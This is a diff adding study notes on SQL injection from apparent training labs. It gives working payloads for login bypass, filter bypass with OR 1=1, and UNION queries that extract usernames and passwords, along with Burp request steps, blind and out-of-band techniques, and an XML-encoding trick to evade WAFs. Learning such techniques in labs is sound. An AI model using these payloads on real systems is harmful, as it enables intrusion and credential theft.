@@ -1,0 +1,155 @@
+SQL injection vulnerability
+   
+   Retrieving Hidden Data
+     Lab #1:
+         
+
+         SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+         End Goal: Display all products both released and unreleased
+
+         Analysis: 
+                     SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+                      
+                     SELECT * FROM products WHERE category = ''' AND released = 1 ##causes an internal server error
+
+                     SELECT * FROM products WHERE category = ''--' AND released = 1 ##'-- is displayed showing vuln to SQLi
+
+                     SELECT * FROM products WHERE category = '' or 1=1 --'
+                      AND released = 1 ##' or 1=1 -- is displayed (Lab Solved)
+
+
+    Subverting Application Logic
+
+        Lab #2:
+        
+        SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+        Attacker: can log in as any user without a password using --
+            Example: submitting the username administrator'-- and a blank password
+            SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+
+        End Goal: SQL injection vulnerability allowing login bypass
+
+        Analysis: 
+        - - - - - 
+
+          Try: weiner / bluecheese to login #invalid username or password
+               Input: ' in username field and anything in password field to test ##you get internal server error
+               
+               SELECT firstname From users WHERE username='admin' and password='admin'
+               SELECT firstname From users WHERE username=''' and password='admin'
+               SELECT firstname From users WHERE username='admin'--' and password='admin'
+               SELECT firstname From users WHERE username='administrator' --
+
+    SQL injection UNION attacks:
+        Lab #3:
+        
+        End Goal: Determine the number of column returned by the query.
+
+        Background (Union):
+            table1          table2
+            a | b           c | d
+            ------          ------
+            1 , 2           2 , 3
+            3 , 4           4 , 5
+
+            Query #1: select a, b from table1
+            1,2
+            3,4
+
+            Query #2: select a, b from table1 UNION select c,d from table2
+            1,2
+            3,4
+            2,3
+            4,5
+
+            Example: select a, b from table1 UNION select usernames, passwords from users
+
+            Rule: 
+                - The number and the order of the columns must be the same in all queries
+                - The data types must be compatible
+
+            SQLi Attack:
+            select ? from table1 UNION select NULL
+            -error -> incorrect number of columns
+
+            select ? from table1 Union select NULL, NULL, NULL
+            - 200 response code -> correct number of columns
+
+            SQLi Attack (Way #2):
+
+            select a, b from table1 order by 1 or 2 or 3, etc until an error is given
+
+        Analysis:
+            category=Gifts' UNION select NULL --
+        Attack (Burp) #1:
+            - Intercept request
+            - Send to Repeater
+            - GET /filter?category=Gifts'UNION%2bselect%2bNULL-- HTTP/1.1 (CTRL+U to URL encode UNION select NULL--)
+            - Send Request (Receive a 500 Internal Error)
+            - Continue to add ,+NULL until you receive a 200 OK Code
+                GET /filter?category=Gifts'UNION+select+NULL,+NULL,+NULL-- HTTP/1.1
+        Attack (Browser) #2:
+            - Gifts' ORDER BY 1-- and so on until you receive and error
+            
+    Retrieving data from other database tables:
+
+        SELECT name, description FROM products WHERE category = 'Gifts'
+                ' UNION SELECT username, password FROM users--
+        
+        Attacker:  can leverage an SQL injection vulnerability to retrieve data from other tables within the database using the UNION keyword, and executes an additional SELECT query and appends the results to the original query
+
+    Examining the database:
+        Following initial identification of an SQL injection vulnerability, it is generally useful to obtain some information about the database itself. This information can often pave the way for further exploitation. 
+
+            Oracle you can execute:
+                SELECT * FROM v$version
+            On most databases:
+                SELECT * FROM information_schema.tables
+        
+    Blind SQL injection vulnerabilities:
+        The application does not return the results of the SQL query or the details of any database errors within its responses. 
+        Blind vulnerabilities can still be exploited.
+        The techniques involved are generally more complicated and difficult to perform.
+
+         Depending on the nature of the vulnerability and the database involved, the following techniques can be used to exploit blind SQL injection vulnerabilities:
+
+            You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
+            You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
+            You can trigger an out-of-band network interaction, using OAST techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control
+
+    How to detect SQL injection vulnerabilities
+         The majority of SQL injection vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.
+
+         SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:
+
+         Submitting the single quote character ' and looking for errors or other anomalies.
+         Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
+         Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application's responses.
+         Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
+         Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions
+
+    SQL injection in different parts of the query:
+         The most common other locations where SQL injection arises are:
+
+         In UPDATE statements, within the updated values or the WHERE clause.
+         In INSERT statements, within the inserted values.
+         In SELECT statements, within the table or column name.
+         In SELECT statements, within the ORDER BY clause.
+
+    SQL injection in different contexts:
+        You can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application.
+        May even provide alternative ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms.
+        You may be able to bypass these filters by simply encoding or escaping characters in the prohibited keywords.
+            For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:
+                <stockCheck>
+                <productId>
+                   123
+                </productId>
+                <storeId>
+                   999 &#x53;ELECT * FROM information_schema.tables
+                </storeId>
+                </stockCheck>
+
+    
